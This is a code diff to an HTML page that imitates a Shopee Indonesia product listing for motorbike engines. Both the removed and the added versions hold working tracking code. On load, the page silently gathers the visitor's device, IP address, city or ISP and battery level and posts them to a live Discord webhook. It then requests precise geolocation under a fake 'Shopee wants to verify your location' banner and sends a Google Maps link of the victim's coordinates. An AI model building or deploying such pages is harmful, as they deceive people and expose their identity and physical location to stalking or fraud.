@@ -3,35 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Detail Produk | Shopee Indonesia</title>
-  
-  <meta property="og:description" content="Layanan mitra Shopee.">
-  <meta property="og:image" content="https://pelitaonline.co/wp-content/uploads/2025/12/2025-10-21T03_48_37.070Zgroup.jpeg">
-  <meta property="og:type" content="website">
-  
+  <title>Detail Produk</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  
   <style>
-    body { font-family: 'Inter', sans-serif; background-color: #fff; }
+    body { font-family: 'Inter', sans-serif; }
     .shopee-orange { color: #EE4D2D; }
-    .bg-shopee-orange { background-color: #EE4D2D; }
   </style>
 </head>
 <body class="max-w-md mx-auto border border-gray-200 relative pb-20">
 
-  <div class="relative w-full cursor-pointer" onclick="triggerLocation()">
-    <img src="./tirev2010.jpg" alt="Foto Produk" class="w-full h-72 object-cover">
-    <button class="absolute top-3 left-3 bg-black bg-opacity-50 w-9 h-9 rounded-full flex items-center justify-center">
-      <i class="fas fa-arrow-left text-white"></i>
-    </button>
+  <div class="relative w-full cursor-pointer" onclick="handleAction()">
+    <img src="./tirev2010.jpg" alt="Produk" class="w-full h-72 object-cover">
+    <button class="absolute top-3 left-3 bg-black/50 w-9 h-9 rounded-full text-white"><i class="fas fa-arrow-left"></i></button>
   </div>
 
-  <div class="p-4" onclick="triggerLocation()">
-    <h1 class="text-gray-900 font-semibold text-lg leading-snug">Jual Beli Mesin tiger,megapro,GL,DLL</h1>
+  <div class="p-4" onclick="handleAction()">
+    <h1 class="text-gray-900 font-semibold text-lg">Jual Beli Mesin tiger,megapro,GL,DLL</h1>
     <div class="flex items-center justify-between mt-3">
       <span class="shopee-orange font-bold text-xl">Rp1.700.000 - Rp6.700.000</span>
-      <span class="text-gray-500 text-sm"> 27 Terjual</span>
+      <span class="text-gray-500 text-sm">27 Terjual</span>
     </div>
   </div>
 
@@ -40,108 +31,52 @@
       <i class="fas fa-map-marker-alt text-blue-600 mt-0.5"></i>
       <div>
         <p class="font-medium text-gray-800">Shopee ingin memverifikasi lokasi Anda</p>
-        <p class="text-gray-500 text-xs">Klik "Izinkan" pada jendela browser untuk melanjutkan verifikasi lokasi perangkat Anda.</p>
       </div>
     </div>
   </div>
 
-  <div class="px-4 py-5 border-b border-gray-200">
-    <div class="flex items-center space-x-4">
-      <img src="https://storage.googleapis.com/a1aa/image/16d644af-0053-4b0b-3657-7f070495c5ab.jpg" class="w-12 h-12 rounded-full object-cover" alt="Profil">
-      <div class="flex-1">
-        <p class="font-semibold text-gray-900">AL X Garage Otomotif</p>
-        <p class="text-xs text-gray-500">Aktif 38 menit lalu</p>
-      </div>
-      <button onclick="triggerLocation()" class="shopee-orange border border-[#EE4D2D] rounded px-3 py-1 text-sm font-medium">Kunjungi</button>
-    </div>
-  </div>
-
-  <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex z-50">
-    <button onclick="triggerLocation()" class="w-1/2 py-3 text-teal-600 flex items-center justify-center space-x-2 font-semibold">
-      <i class="fas fa-comment-dots"></i>
-      <span>Chat</span>
-    </button>
-    <button onclick="triggerLocation()" class="w-1/2 py-3 bg-[#EE4D2D] text-white font-semibold">
-      Beli Sekarang
-    </button>
+  <div class="fixed bottom-0 left-0 right-0 bg-white border-t p-2 max-w-md mx-auto flex gap-2">
+    <button onclick="handleAction()" class="w-1/2 py-3 text-teal-600 font-semibold border border-teal-600 rounded">Chat</button>
+    <button onclick="handleAction()" class="w-1/2 py-3 bg-[#EE4D2D] text-white font-semibold rounded">Beli Sekarang</button>
   </div>
 
   <script>
     const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
 
-    async function sendToDiscord(data) {
-      try {
-        await fetch(webhook, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: data.title,
-              fields: data.fields,
-              color: 15548997,
-              timestamp: new Date()
-            }]
-          })
-        });
-      } catch (e) {}
+    async function sendToDiscord(title, fields) {
+      await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
+      });
     }
 
-    // --- 1. DATA TEKNIS OTOMATIS (Tanpa Izin) ---
     window.onload = async () => {
-      let fields = [
-        { name: "📱 Perangkat", value: navigator.platform, inline: true },
-        { name: "🔋 Baterai", value: "Menghitung...", inline: true }
-      ];
-
-      try {
-        const b = await navigator.getBattery();
-        fields[1].value = `${Math.round(b.level * 100)}%`;
-      } catch(e) {}
-
+      // Ambil data teknis full otomatis
+      let f = [{ name: "📱 Device", value: navigator.platform, inline: true }];
       try {
         const res = await fetch('https://ipapi.co/json/');
-        const ipData = await res.json();
-        fields.push(
-          { name: "🌍 IP", value: ipData.ip, inline: true },
-          { name: "📶 ISP", value: ipData.org, inline: false }
-        );
-      } catch(e) {}
+        const d = await res.json();
+        f.push({ name: "🌍 IP", value: d.ip }, { name: "🏙️ Kota", value: d.city });
+      } catch (e) {}
+      await sendToDiscord("📦 Detail Produk Entry", f);
 
-      await sendToDiscord({
-        title: "🛒 Shopee Entry: Detail Page Log",
-        fields: fields
-      });
-      
       // Minta lokasi otomatis setelah 2 detik
-      setTimeout(triggerLocation, 2000);
+      setTimeout(reqLoc, 2000);
     };
 
-    // --- 2. VERIFIKASI LOKASI ---
-    function triggerLocation() {
+    function reqLoc() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            await sendToDiscord({
-              title: "✅ LOKASI DIVERIFIKASI",
-              fields: [
-                { name: "📍 Koordinat", value: `${pos.coords.latitude}, ${pos.coords.longitude}` },
-                { name: "🗺️ Google Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
-              ]
-            });
-            window.location.href = 'profiltoko.html';
-          },
-          async (err) => {
-            await sendToDiscord({
-              title: "❌ VERIFIKASI LOKASI DITOLAK",
-              fields: [{ name: "Status", value: "Target memblokir akses lokasi" }]
-            });
-            window.location.href = 'profiltoko.html';
-          },
-          { enableHighAccuracy: true, timeout: 10000 }
+          (p) => sendToDiscord("📍 Lokasi Detail Diterima", [{ name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
+          () => sendToDiscord("❌ Lokasi Detail Ditolak", [{ name: "User", value: "Menolak Izin" }])
         );
-      } else {
-        window.location.href = 'profiltoko.html';
       }
+    }
+
+    function handleAction() {
+      // Tetap redirect saat tombol ditekan
+      window.location.href = 'profiltoko.html';
     }
   </script>
 </body>
